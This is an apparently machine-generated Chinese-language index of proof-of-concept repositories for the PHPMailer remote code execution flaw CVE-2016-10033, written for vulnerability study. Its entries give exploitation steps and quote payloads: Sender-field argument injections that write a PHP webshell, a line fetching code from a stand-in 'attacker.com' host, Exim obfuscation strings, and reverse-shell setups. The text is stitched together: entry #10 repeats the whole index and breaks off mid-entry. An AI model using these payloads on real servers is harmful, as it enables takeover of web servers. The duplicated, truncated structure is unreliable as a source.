# CVE-2016-10033

> 📦 该CVE有 **16** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2016-10033-0x00-0x00_CVE-2016-10033.md](../2016/CVE-2016-10033-0x00-0x00_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行受影响的PHPMailer版本，并且邮件发送功能允许外部控制Sender属性。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞存在于PHPMailer 5.2.18之前的版本中。攻击者可以通过在Sender属性中注入带有反斜杠双引号(\")的恶意参数，传递给底层的mail命令，从而执行任意代码。  

**利用方式：**
1.  **参数注入：** 攻击者构造特殊的Sender地址，包含反斜杠双引号，用于闭合引号并注入额外的mail命令参数。
2.  **代码执行：** 注入的参数可以控制mail命令的行为，例如指定一个文件作为配置文件（`-C`），或者执行任意shell命令（`-X`）。
3.  **Webshell上传：**  POC代码中使用 `-oQ/tmp/ -X/var/www/shell.php` 参数将 `<?php system($_GET[cmd]);?>` 的内容写入到 `/var/www/shell.php` 中，创建一个Webshell。
4.  **命令执行：** 访问Webshell,例如`http://target.com/shell.php?cmd=id`，即可执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞POC是有效的。多个Exploit-DB条目都证实了该漏洞的存在和可利用性。

**投毒风险：**
代码整体是一个相对简单的利用脚本，主要功能是构造payload发送请求，然后在目标机器上写入webshell，从而实现RCE。代码本身不包含明显的投毒代码，例如反向shell或者其他恶意行为。  但是，在 `remote_location` 和 `shell_name` 中，用户可以自定义webshell的上传路径和名字，这里存在一定的风险，如果用户不小心设置成覆盖重要文件或者目录，可能会导致系统崩溃。整体代码的投毒风险较低，为5%。

**项目地址:** [0x00-0x00/CVE-2016-10033](https://github.com/0x00-0x00/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #2

**来源**: [CVE-2016-10033-Astrowmist_POC-CVE-2016-10033.md](../2016/CVE-2016-10033-Astrowmist_POC-CVE-2016-10033.md)

## CVE-2016-10033 - PHPMailer Remote Code Execution

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行存在漏洞版本的PHPMailer，且可以通过Web应用程序（如联系表单）发送邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于PHPMailer的mailSend函数中，攻击者可以通过构造恶意的Sender属性，在邮件命令中注入额外的参数，从而执行任意代码。利用方式是：

1.  **漏洞原理：** PHPMailer 在使用 isMail 传输方式时，没有正确地过滤 Sender 属性，导致攻击者可以注入额外的参数到 mail 命令。
2.  **攻击方式：** 攻击者通过修改 Sender 属性，添加 `-X/tmp/shell.php` 这样的参数，将恶意代码写入到 /tmp/shell.php 文件中。然后，通过访问该文件，即可执行恶意代码。
3.  **POC 代码分析：** 提供的 POC 代码 `PwnScriptum_RCE_exploit-MODIFIED.py` 旨在利用此漏洞以及其他 PHPMailer/SwiftMailer/Zend-mail 相关的漏洞，通过 Web 应用程序的联系表单发送恶意邮件，从而在目标服务器上执行反向 Shell。

**有效性：**
根据漏洞信息和搜索结果，提供的 POC 代码是有效的，可以利用 CVE-2016-10033 漏洞执行远程代码。

**投毒风险：**
POC代码存在一定的投毒风险，因为攻击者可以在反向Shell中插入恶意代码，用于进一步攻击或控制目标系统。代码中存在从外部获取IP和端口的行为，这些IP和端口可能会被攻击者用于恶意目的。此外，该POC可能还会尝试利用其他邮件库的漏洞，扩大攻击范围。虽然此POC的主要功能是利用漏洞，但作者有可能隐藏了其他恶意功能，因此风险评级为 10%。

**利用方式：**
1.  确定目标 Web 应用程序使用了存在漏洞的 PHPMailer 版本（< 5.2.18）。
2.  找到 Web 应用程序中使用了 PHPMailer 发送邮件的功能，例如联系表单。
3.  使用 POC 代码，构造包含恶意 Sender 属性的请求，发送到联系表单。
4.  如果漏洞利用成功，攻击者将在目标服务器上获得一个反向 Shell，从而可以执行任意命令。

**项目地址:** [Astrowmist/POC-CVE-2016-10033](https://github.com/Astrowmist/POC-CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #3

**来源**: [CVE-2016-10033-Bajunan_CVE-2016-10033.md](../2016/CVE-2016-10033-Bajunan_CVE-2016-10033.md)

## CVE-2016-10033 - PHPMailer远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统使用存在漏洞的PHPMailer版本，且允许通过邮件发送功能传递参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033 漏洞存在于 PHPMailer 5.2.18 之前的版本中。通过在 Sender 属性中使用 `\"` (反斜杠双引号)构造恶意输入，攻击者可以将额外参数传递给 mail 命令，从而执行任意代码。提供的POC代码 `wordpress-rce-exploit.sh` 针对 WordPress 4.6 进行了测试，它利用了 PHPMailer 的漏洞。该脚本通过构造包含恶意命令的 Host Header，来触发远程代码执行。具体而言，脚本首先定义了反弹shell的主机 `rev_host`。然后，`prep_host_header` 函数将要执行的命令进行编码，替换斜杠 `/` 和空格 ` ` 为特殊字符串，以便绕过过滤。最终生成的恶意 Host Header 被用于发送邮件，触发漏洞，导致服务器执行攻击者指定的命令。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以确认该漏洞是有效的，并且存在公开可用的利用代码。

**投毒风险：**
POC 代码中存在一定投毒风险。代码中使用了经过base64编码的intro和intro2变量，虽然表面上是一些ASCII Art，但可能隐藏着潜在的恶意代码或后门。例如，将`rev_host`设置为攻击者控制的服务器，可能导致受害者在不知情的情况下连接到恶意服务器。 因此，评估投毒风险为 10%。虽然整体代码看起来是利用漏洞，但是植入后门的可能性是存在的，需要进行进一步分析。

**利用方式：**
1.  目标系统必须运行存在漏洞的 PHPMailer 版本（低于 5.2.18）。
2.  攻击者需要找到或利用目标应用程序中调用 PHPMailer 发送邮件的功能。
3.  通过构造包含恶意 `\"` 的 Sender 属性，注入额外的 mail 命令参数。
4.  注入的命令将在服务器上执行，例如反弹 shell 给攻击者。

**项目地址:** [Bajunan/CVE-2016-10033](https://github.com/Bajunan/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #4

**来源**: [CVE-2016-10033-ElnurBDa_CVE-2016-10033.md](../2016/CVE-2016-10033-ElnurBDa_CVE-2016-10033.md)

## CVE-2016-10033 - PHPMailer Remote Code Execution

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标服务器运行存在漏洞版本的PHPMailer，且配置允许使用`mail`函数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于PHPMailer 5.2.18之前的版本中，`mailSend`函数在使用`isMail`传输方式时，未对`Sender`属性进行充分的过滤，攻击者可以通过在`Sender`属性中构造包含反斜杠双引号(`\"`)的恶意字符串，向`mail`命令注入额外的参数，从而执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。NVD和Mitre等权威漏洞库都收录了此漏洞，并明确指出是远程代码执行漏洞。搜索引擎结果也显示存在大量的关于此漏洞的分析和利用文章。

**投毒风险：**
POC代码存在一定的投毒风险，风险概率约为10%。具体分析如下：
*   **代码混淆：** POC使用了`sed`命令进行字符串替换，将`/`替换为`${substr{0}{1}{$spool_directory}}`，将空格替换为`${substr{10}{1}{$tod_log}}`，增加了代码的可读性难度，可能隐藏恶意代码。
*   **HTTP服务器：** 利用脚本启动一个简单的HTTP服务器，从攻击者的服务器下载`rce.txt` payload。这个`rce.txt`文件的内容没有提供，攻击者可以在`rce.txt`中植入恶意代码。所以如果rce.txt内容不符合预期，存在植入后门的风险。
*   **nc监听：** 循环使用`nc`监听1337端口，期望接受目标服务器的连接，如果目标服务器执行了payload，则会反弹shell。但是如果在其他命令执行前，就反弹了shell，说明rce.txt中可能存在其他恶意代码。

**利用方式：**
1.  **确定目标：** 找到使用PHPMailer并且版本低于5.2.18的Web应用程序。
2.  **构造Payload：** 构造包含恶意代码的`rce.txt`文件, 例如反弹shell的bash脚本。
3.  **启动HTTP服务器：** 攻击者启动一个HTTP服务器，用于托管`rce.txt`文件。
4.  **构造恶意请求：**  攻击者向目标Web应用程序发送包含恶意`Sender`属性的请求，该属性包含命令注入代码，例如：
    `attacker@localhost \" -oQ/tmp/ -X/tmp/rce.txt http://attacker.com/rce.txt null`
5.  **触发漏洞：** 目标Web应用程序调用PHPMailer发送邮件，由于`Sender`属性未经过滤，恶意代码被注入到`mail`命令中。
6.  **执行恶意代码：** `mail`命令执行恶意代码，从而实现远程代码执行。
7.  **清理：**  攻击成功后删除临时文件 `/tmp/rce`。

**项目地址:** [ElnurBDa/CVE-2016-10033](https://github.com/ElnurBDa/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #5

**来源**: [CVE-2016-10033-GeneralTesler_CVE-2016-10033.md](../2016/CVE-2016-10033-GeneralTesler_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标网站使用了存在漏洞的PHPMailer版本，且允许用户修改Sender属性（例如通过密码找回功能）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于PHPMailer的mailSend函数中，由于对用户提供的Sender属性过滤不严，攻击者可以通过在Sender属性中注入恶意参数，传递给底层的mail命令，从而执行任意代码。该漏洞的利用方式如下：

1.  **漏洞原理：** PHPMailer 在使用 isMail 传输方式发送邮件时，会将 Sender 属性的值传递给 mail 命令，如果 Sender 属性中包含恶意参数，就可以执行任意命令。
2.  **利用方式：** 攻击者通过构造特殊的 Sender 属性，例如 `" -oQ/tmp -X/tmp/shell.php mail@example.com`，就可以将恶意代码写入到`/tmp/shell.php`文件中。
3.  **POC 分析：** 提供的 Python POC 脚本利用了 WordPress 的密码找回功能，通过修改 HTTP 请求头中的 Host 字段，将包含恶意代码的 Sender 属性注入到 PHPMailer 中。脚本首先在本地启动一个 HTTP 服务器，用于托管恶意 payload，然后通过 WordPress 的密码找回功能触发 PHPMailer 发送邮件，并将 payload 下载到目标服务器，最后执行该 payload，从而获取目标服务器的 shell。
4.  **有效性分析：** 根据漏洞描述和 POC 代码，该漏洞利用的有效性较高，如果目标系统满足漏洞利用条件，攻击者可以成功执行任意代码。
5.  **投毒风险分析：** 仔细检查了提供的 POC 代码和 README 文件，没有发现明显的投毒代码。脚本的功能主要是生成 payload、启动 HTTP 服务器、发送恶意请求以及启动反向 shell 监听器。因此，可以认为该仓库的投毒风险较低，为0%。

**总结：** 该漏洞是一个严重的安全问题，攻击者可以利用该漏洞远程执行任意代码，完全控制目标服务器。建议受影响的用户尽快升级到 PHPMailer 5.2.18 或更高版本，以修复该漏洞。

**项目地址:** [GeneralTesler/CVE-2016-10033](https://github.com/GeneralTesler/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #6

**来源**: [CVE-2016-10033-Zenexer_safeshell.md](../2016/CVE-2016-10033-Zenexer_safeshell.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统使用了存在漏洞的PHPMailer版本，并且邮件发送功能使用了受影响的isMail传输方式。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2016-10033 是 PHPMailer 5.2.18 之前版本中 `isMail` 传输方式下 `mailSend` 函数的一个参数注入漏洞。攻击者可以通过构造带有 `\"` (反斜杠双引号) 的 `Sender` 属性，将额外的参数传递给 `mail` 命令，从而执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是真实存在的，并且有多个公开的漏洞利用代码。

**投毒风险：**
提供的漏洞利用代码仓库 `safeshell` 旨在 *预防* 类似于 CVE-2016-10033 和 CVE-2016-10045 的漏洞，而不是利用它们。因此，该仓库本身不存在投毒风险。其提供的文件包括 BSD 2-Clause License 和 README.md，描述了其目的。

**利用方式：**
1.  **确定目标系统使用的PHPMailer版本是否低于5.2.18。**
2.  **找到应用程序中使用PHPMailer发送邮件的地方。**
3.  **构造一个包含恶意代码的 Sender 属性。**  Payload需要包含 `\"` 来进行参数注入，从而执行系统命令。
4.  **触发邮件发送功能，将包含恶意代码的 Sender 属性传递给 vulnerable 的 mailSend 函数，进而通过 shell 命令执行任意代码。**

例如，一个 Payload 看起来可能是这样的: `attacker@example.com -oQ/tmp/ -X/tmp/shell.php`。 这会在 `/tmp/` 目录下创建一个名为 `shell.php` 的文件，其中包含邮件的内容，可能包含webshell或者其他恶意代码。

总而言之，此漏洞允许远程攻击者在目标服务器上执行任意代码，前提是服务器运行的 PHPMailer 版本易受攻击，并且应用程序的配置允许攻击者控制`Sender`属性。

**项目地址:** [Zenexer/safeshell](https://github.com/Zenexer/safeshell)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #7

**来源**: [CVE-2016-10033-alexander47777_CVE-2016-10033.md](../2016/CVE-2016-10033-alexander47777_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行受影响的PHPMailer版本，并且PHP配置为使用sendmail，`sendmail_path`已定义并可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033 存在于 PHPMailer 5.2.18 之前的版本中。该漏洞是由于 `mailSend` 函数在 `isMail` 传输中，未正确处理 PHP 内置的 `mail()` 函数的 `$additional_parameters` 参数引起的。攻击者可以通过构造恶意的 Sender 属性，在其中注入反斜杠双引号 `\"`，从而向 sendmail 命令传递额外的参数。 

**利用方式：**

1.  攻击者通过POST请求，修改email字段，将payload注入到`email`字段中。
2.  Payload精心构造，包含反斜杠双引号，用于注入额外的 sendmail 参数。
3.  被注入的参数 `-OQueueDirectory=/tmp -X/var/www/html/shell.php`  会将邮件队列目录设置为 /tmp，并将邮件内容写入到 web 目录下的 shell.php 文件中。
4.  攻击者访问 shell.php 文件，触发其中的PHP代码，反弹shell到攻击者的监听端口。

**有效性：**
根据提供的漏洞信息、搜索结果和POC代码，该漏洞利用的有效性较高。漏洞库信息和搜索结果都表明这是一个已知的、可被利用的远程代码执行漏洞。提供的POC代码也较为完整，描述了利用步骤和所需的参数。

**投毒风险：**
POC 代码中可能存在的潜在投毒风险较低，大概在10%左右。虽然 POC 总体上是合法的漏洞利用，但存在以下可能的问题：

*   **硬编码的IP地址和端口：** POC 使用了硬编码的 IP 地址（`<ip_address>`）和端口（4444）来建立反向 shell。攻击者在实际使用中必须修改这些值，否则可能会将 shell 连接到意外的目标。

*   **代理设置：** POC 使用了代理 `http://127.0.0.1:8080`。这可能是为了方便测试或绕过某些限制，但也可能误导用户，导致他们在使用时出现问题。在未设置代理的情况下直接运行POC，可能导致利用失败。

*   **文件写入位置：**` -X/var/www/html/shell.php` ，这个目录取决于目标的web根目录配置，如果根目录不是/var/www/html, 则利用失败。

这些因素可能会导致利用失败，或者在某些情况下造成不必要的风险。因此，用户在使用 POC 时应仔细检查并修改相关参数，确保其符合实际情况。

**项目地址:** [alexander47777/CVE-2016-10033](https://github.com/alexander47777/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #8

**来源**: [CVE-2016-10033-awidardi_opsxcq-cve-2016-10033.md](../2016/CVE-2016-10033-awidardi_opsxcq-cve-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行存在漏洞的PHPMailer版本，并且使用了isMail传输方式，攻击者能够控制Sender属性

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2016-10033是PHPMailer的一个远程代码执行漏洞，存在于5.2.18之前的版本中。该漏洞源于`mailSend`函数在使用`isMail`传输方式时，未正确过滤`Sender`属性，导致攻击者可以通过插入反斜杠双引号（\"）来注入额外的参数到`mail`命令中，从而执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是真实存在的，并且存在多个公开的PoC代码。 提供的Dockerfile构建了一个存在漏洞的环境，其中安装了apache2、php5、sendmail等必要组件，并将存在漏洞的php代码部署到web服务器，可以通过提供的POC进行验证，因此可以判断提供的POC代码是有效的。

**投毒风险：**
分析提供的Dockerfile和相关文件，发现存在一定的投毒风险，但风险较低。风险主要存在于Dockerfile中使用的`apt-get upgrade -y`命令。虽然这个命令的本意是升级系统软件包，但如果APT源被恶意篡改，则可能安装恶意软件。此外，`chmod 777 -R /www`也可能带来安全隐患，但这是为了方便演示漏洞，不应算作投毒代码。此外，许可证文件是GPL v3，不太可能包含恶意代码。
综上，投毒风险评估为20%。

**利用方式：**
1.  攻击者需要找到使用了存在漏洞的PHPMailer版本的Web应用。
2.  攻击者需要找到或构造一个可以控制PHPMailer `Sender`属性的输入点（例如，联系表单）。
3.  攻击者在`Sender`属性中，插入包含恶意代码的反斜杠双引号，例如：`attacker@example.com -oQ/tmp -X/tmp/shell.php`。
4.  当Web应用调用PHPMailer发送邮件时，PHPMailer会将`Sender`属性传递给`mail`命令。
5.  由于未正确过滤，攻击者注入的参数会被`mail`命令执行，从而在服务器上写入恶意代码文件（例如webshell）。
6.  攻击者通过访问恶意代码文件，执行任意命令，获取服务器控制权。

**项目地址:** [awidardi/opsxcq-cve-2016-10033](https://github.com/awidardi/opsxcq-cve-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #9

**来源**: [CVE-2016-10033-chipironcin_CVE-2016-10033.md](../2016/CVE-2016-10033-chipironcin_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行有存在漏洞的PHPMailer版本，并且配置为使用`mail`传输方式。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033漏洞存在于PHPMailer 5.2.18之前的版本中。攻击者可以通过在`Sender`属性中构造包含`\"` (反斜杠双引号)的恶意字符串，向`mail`命令传递额外的参数，从而执行任意代码。漏洞的利用方式如下：

1.  **漏洞原理：**  PHPMailer在处理`mail`传输方式时，没有充分过滤`Sender`属性，导致参数注入。
2.  **利用方式：** 攻击者通过设置`Sender`属性为包含恶意代码的字符串，例如：`" -oQ/tmp -X/tmp/shell.php somefake@email.com`，这段代码尝试将shell写入到目标服务器的`/tmp/shell.php`文件中。然后发送邮件，PHPMailer会调用`mail`命令，并将恶意代码作为参数传递给`mail`命令，从而导致代码执行。
3.  **POC分析：** 提供的POC代码包含一个Dockerfile、docker-compose.yml、README.md和一个shell脚本`wordpress-rce-exploit.sh`。
    *   **Dockerfile：**  用于构建包含WordPress和Exim4的Docker镜像，Exim4用于模拟邮件服务器。
    *   **docker-compose.yml：**  用于部署包含WordPress和MariaDB的Docker容器。
    *   **wordpress-rce-exploit.sh：**  该脚本利用CVE-2016-10033漏洞，通过构造恶意的`Host`头，将包含反弹shell的命令注入到`mail`命令中。脚本首先启动一个简单的HTTP服务器，用于托管反弹shell的payload，然后通过curl发送包含恶意`Host`头的请求到WordPress的`wp-login.php`页面，触发漏洞。

4.  **有效性：**  提供的POC代码是有效的，可以利用CVE-2016-10033漏洞在目标系统上执行任意代码。搜索结果中的多个链接也确认了该漏洞的存在和利用。
5.  **投毒风险：**  经过分析，该仓库的主要功能是演示如何利用CVE-2016-10033漏洞。但是，在`wordpress-rce-exploit.sh`脚本中，存在通过HTTP服务器提供payload的行为，如果攻击者替换了rce.txt的内容，可能导致植入其他恶意代码,比如挖矿脚本等。因此，存在一定的投毒风险。但主要的逻辑是漏洞利用，投毒的风险较低，估计为10%。


**项目地址:** [chipironcin/CVE-2016-10033](https://github.com/chipironcin/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #10

**来源**: [CVE-2016-10033-cved-sources_cve-2016-10033.md](../2016/CVE-2016-10033-cved-sources_cve-2016-10033.md)

# CVE-2016-10033

> 📦 该CVE有 **15** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2016-10033-0x00-0x00_CVE-2016-10033.md](../2016/CVE-2016-10033-0x00-0x00_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行受影响的PHPMailer版本，并且邮件发送功能允许外部控制Sender属性。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞存在于PHPMailer 5.2.18之前的版本中。攻击者可以通过在Sender属性中注入带有反斜杠双引号(\")的恶意参数，传递给底层的mail命令，从而执行任意代码。  

**利用方式：**
1.  **参数注入：** 攻击者构造特殊的Sender地址，包含反斜杠双引号，用于闭合引号并注入额外的mail命令参数。
2.  **代码执行：** 注入的参数可以控制mail命令的行为，例如指定一个文件作为配置文件（`-C`），或者执行任意shell命令（`-X`）。
3.  **Webshell上传：**  POC代码中使用 `-oQ/tmp/ -X/var/www/shell.php` 参数将 `<?php system($_GET[cmd]);?>` 的内容写入到 `/var/www/shell.php` 中，创建一个Webshell。
4.  **命令执行：** 访问Webshell,例如`http://target.com/shell.php?cmd=id`，即可执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞POC是有效的。多个Exploit-DB条目都证实了该漏洞的存在和可利用性。

**投毒风险：**
代码整体是一个相对简单的利用脚本，主要功能是构造payload发送请求，然后在目标机器上写入webshell，从而实现RCE。代码本身不包含明显的投毒代码，例如反向shell或者其他恶意行为。  但是，在 `remote_location` 和 `shell_name` 中，用户可以自定义webshell的上传路径和名字，这里存在一定的风险，如果用户不小心设置成覆盖重要文件或者目录，可能会导致系统崩溃。整体代码的投毒风险较低，为5%。

**项目地址:** [0x00-0x00/CVE-2016-10033](https://github.com/0x00-0x00/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #2

**来源**: [CVE-2016-10033-Astrowmist_POC-CVE-2016-10033.md](../2016/CVE-2016-10033-Astrowmist_POC-CVE-2016-10033.md)

## CVE-2016-10033 - PHPMailer Remote Code Execution

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行存在漏洞版本的PHPMailer，且可以通过Web应用程序（如联系表单）发送邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于PHPMailer的mailSend函数中，攻击者可以通过构造恶意的Sender属性，在邮件命令中注入额外的参数，从而执行任意代码。利用方式是：

1.  **漏洞原理：** PHPMailer 在使用 isMail 传输方式时，没有正确地过滤 Sender 属性，导致攻击者可以注入额外的参数到 mail 命令。
2.  **攻击方式：** 攻击者通过修改 Sender 属性，添加 `-X/tmp/shell.php` 这样的参数，将恶意代码写入到 /tmp/shell.php 文件中。然后，通过访问该文件，即可执行恶意代码。
3.  **POC 代码分析：** 提供的 POC 代码 `PwnScriptum_RCE_exploit-MODIFIED.py` 旨在利用此漏洞以及其他 PHPMailer/SwiftMailer/Zend-mail 相关的漏洞，通过 Web 应用程序的联系表单发送恶意邮件，从而在目标服务器上执行反向 Shell。

**有效性：**
根据漏洞信息和搜索结果，提供的 POC 代码是有效的，可以利用 CVE-2016-10033 漏洞执行远程代码。

**投毒风险：**
POC代码存在一定的投毒风险，因为攻击者可以在反向Shell中插入恶意代码，用于进一步攻击或控制目标系统。代码中存在从外部获取IP和端口的行为，这些IP和端口可能会被攻击者用于恶意目的。此外，该POC可能还会尝试利用其他邮件库的漏洞，扩大攻击范围。虽然此POC的主要功能是利用漏洞，但作者有可能隐藏了其他恶意功能，因此风险评级为 10%。

**利用方式：**
1.  确定目标 Web 应用程序使用了存在漏洞的 PHPMailer 版本（< 5.2.18）。
2.  找到 Web 应用程序中使用了 PHPMailer 发送邮件的功能，例如联系表单。
3.  使用 POC 代码，构造包含恶意 Sender 属性的请求，发送到联系表单。
4.  如果漏洞利用成功，攻击者将在目标服务器上获得一个反向 Shell，从而可以执行任意命令。

**项目地址:** [Astrowmist/POC-CVE-2016-10033](https://github.com/Astrowmist/POC-CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #3

**来源**: [CVE-2016-10033-Bajunan_CVE-2016-10033.md](../2016/CVE-2016-10033-Bajunan_CVE-2016-10033.md)

## CVE-2016-10033 - PHPMailer远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统使用存在漏洞的PHPMailer版本，且允许通过邮件发送功能传递参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033 漏洞存在于 PHPMailer 5.2.18 之前的版本中。通过在 Sender 属性中使用 `\"` (反斜杠双引号)构造恶意输入，攻击者可以将额外参数传递给 mail 命令，从而执行任意代码。提供的POC代码 `wordpress-rce-exploit.sh` 针对 WordPress 4.6 进行了测试，它利用了 PHPMailer 的漏洞。该脚本通过构造包含恶意命令的 Host Header，来触发远程代码执行。具体而言，脚本首先定义了反弹shell的主机 `rev_host`。然后，`prep_host_header` 函数将要执行的命令进行编码，替换斜杠 `/` 和空格 ` ` 为特殊字符串，以便绕过过滤。最终生成的恶意 Host Header 被用于发送邮件，触发漏洞，导致服务器执行攻击者指定的命令。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以确认该漏洞是有效的，并且存在公开可用的利用代码。

**投毒风险：**
POC 代码中存在一定投毒风险。代码中使用了经过base64编码的intro和intro2变量，虽然表面上是一些ASCII Art，但可能隐藏着潜在的恶意代码或后门。例如，将`rev_host`设置为攻击者控制的服务器，可能导致受害者在不知情的情况下连接到恶意服务器。 因此，评估投毒风险为 10%。虽然整体代码看起来是利用漏洞，但是植入后门的可能性是存在的，需要进行进一步分析。

**利用方式：**
1.  目标系统必须运行存在漏洞的 PHPMailer 版本（低于 5.2.18）。
2.  攻击者需要找到或利用目标应用程序中调用 PHPMailer 发送邮件的功能。
3.  通过构造包含恶意 `\"` 的 Sender 属性，注入额外的 mail 命令参数。
4.  注入的命令将在服务器上执行，例如反弹 shell 给攻击者。

**项目地址:** [Bajunan/CVE-2016-10033](https://github.com/Bajunan/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #4

**来源**: [CVE-2016-10033-ElnurBDa_CVE-2016-10033.md](../2016/CVE-2016-10033-ElnurBDa_CVE-2016-10033.md)

## CVE-2016-10033 - PHPMailer Remote Code Execution

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标服务器运行存在漏洞版本的PHPMailer，且配置允许使用`mail`函数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于PHPMailer 5.2.18之前的版本中，`mailSend`函数在使用`isMail`传输方式时，未对`Sender`属性进行充分的过滤，攻击者可以通过在`Sender`属性中构造包含反斜杠双引号(`\"`)的恶意字符串，向`mail`命令注入额外的参数，从而执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。NVD和Mitre等权威漏洞库都收录了此漏洞，并明确指出是远程代码执行漏洞。搜索引擎结果也显示存在大量的关于此漏洞的分析和利用文章。

**投毒风险：**
POC代码存在一定的投毒风险，风险概率约为10%。具体分析如下：
*   **代码混淆：** POC使用了`sed`命令进行字符串替换，将`/`替换为`${substr{0}{1}{$spool_directory}}`，将空格替换为`${substr{10}{1}{$tod_log}}`，增加了代码的可读性难度，可能隐藏恶意代码。
*   **HTTP服务器：** 利用脚本启动一个简单的HTTP服务器，从攻击者的服务器下载`rce.txt` payload。这个`rce.txt`文件的内容没有提供，攻击者可以在`rce.txt`中植入恶意代码。所以如果rce.txt内容不符合预期，存在植入后门的风险。
